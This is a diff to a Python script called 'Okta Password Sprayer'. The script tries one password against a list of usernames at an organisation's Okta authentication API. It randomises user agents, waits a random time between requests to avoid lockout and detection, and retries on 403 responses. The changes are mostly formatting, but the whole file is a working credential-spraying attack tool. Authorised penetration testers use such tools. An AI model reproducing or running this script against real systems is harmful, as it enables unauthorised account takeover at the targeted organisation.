@@ -8,7 +8,7 @@ import random
 
 if ((len(sys.argv) < 9 or len(sys.argv) > 9) and '-h' not in sys.argv):
     print("\nUsage:")
-    print("python3 %s -f <inputfile> -d <domain>\nThen enter password to spray with when prompted.\n" % sys.argv[0])
+    print(f"python3 {sys.argv[0]} -f <inputfile> -d <domain> -n <min waiting time> -x <max waiting time>\nThen enter password to spray with when prompted.\n")
     sys.exit(1)
 
 
@@ -26,7 +26,7 @@ domain2 = domain[0]
 min_wait = int(options.min)
 max_wait = int(options.max)
 
-oktadomain = '%s.okta.com' % domain2
+oktadomain = f'{domain2}.okta.com'
 
 # user agents to randomize each request
 user_agents = [
@@ -64,51 +64,51 @@ user_agents = [
 ]
 
 
-url = 'https://%s/api/v1/authn' % oktadomain
+url = f'https://{oktadomain}/api/v1/authn'
 
 print("+"*100)
 print("Okta Password Sprayer")
 print("+"*100)
-print(f"Spraying...with a random wait time between {min_wait}-{max_wait} seconds...")
-with open ("%s" % options.inputfile, "r") as oktausers:
+print(f"Spraying...with random wait time between {min_wait}-{max_wait} seconds...")
+with open (f"{options.inputfile}", "r") as oktausers:
     for line in oktausers:
         sleeptime = random.randint(min_wait, max_wait)
         try:
             usr = line.strip()
-            data = {"username":"{}".format(usr),"options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"},"password":"{}".format(password)}
-            print("--Waiting %s seconds..." % sleeptime)
+            data = {"username":f"{format(usr)}","options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"},"password":f"{format(password)}"}
+            print(f"--Waiting {sleeptime} seconds...")
             time.sleep(sleeptime)
             headers = {'User-Agent': random.choice(user_agents)}
             response = requests.post(url, headers=headers, json=data)
             
             if response.status_code == 200:
-                print("\033[92mlogin successful - %s:%s\033[0m" % (usr, password))
+                print(f"\033[92mlogin successful - {usr}:{password}\033[0m")
                 print("\033[1mOkta Response Info:\033[0m")
-                print(response.text)
+                print(response.text.encode('utf-8'))
                 response.close()
             elif response.status_code == 403:
-                print("\033[93mForbidden access - %s (%s)\033[0m" % (usr, response.status_code))
+                print(f"\033[93mForbidden access - {usr} ({response.status_code}) \033[0m")
                 # Retry as long as response is 403
                 while response.status_code == 403:
                     sleeptime = random.randint(min_wait, max_wait)
                     print("[+]> repeating the request after wait time")
-                    print("--Waiting %s seconds..." % (sleeptime,))
+                    print(f"--Waiting {sleeptime} seconds...")
                     time.sleep(sleeptime)
                     headers = {'User-Agent': random.choice(user_agents)}
                     response = requests.post(url, headers=headers, json=data)
                     if response.status_code == 200:
-                        print("\033[92mlogin successful - %s:%s\033[0m" % (usr, password))
+                        print(f"\033[92mlogin successful - {usr}:{password}\033[0m")
                         print("\033[1mOkta Response Info:\033[0m")
                         print(response.text)
                     elif response.status_code == 401:
-                        print("\033[91mAuthentication failed - %s:%s (%s)\033[0m" % (usr, password, response.status_code))
+                        print(f"\033[91mAuthentication failed - {usr}:{password} ({response.status_code}) \033[0m")
                     else:
-                        print("\033[91mError - %s:%s\033[0m" % (usr, password, response.status_code))
+                        print(f"\033[91mAnother Error - {usr}:{password} ({response.status_code}) \033[0m")
                 response.close()
             elif response.status_code == 401:
-                print("\033[91mAuthentication failed - %s:%s (%s)\033[0m" % (usr, password, response.status_code))
+                print(f"\033[91mAuthentication failed - {usr}:{password} ({response.status_code}) \033[0m")
             else:
-                print("\033[91mError - %s:%s\033[0m" % (usr, password, response.status_code))
+                print(f"\033[91mAnother Error - {usr}:{password} ({response.status_code}) \033[0m")
 
         except Exception as e:
             print(e)
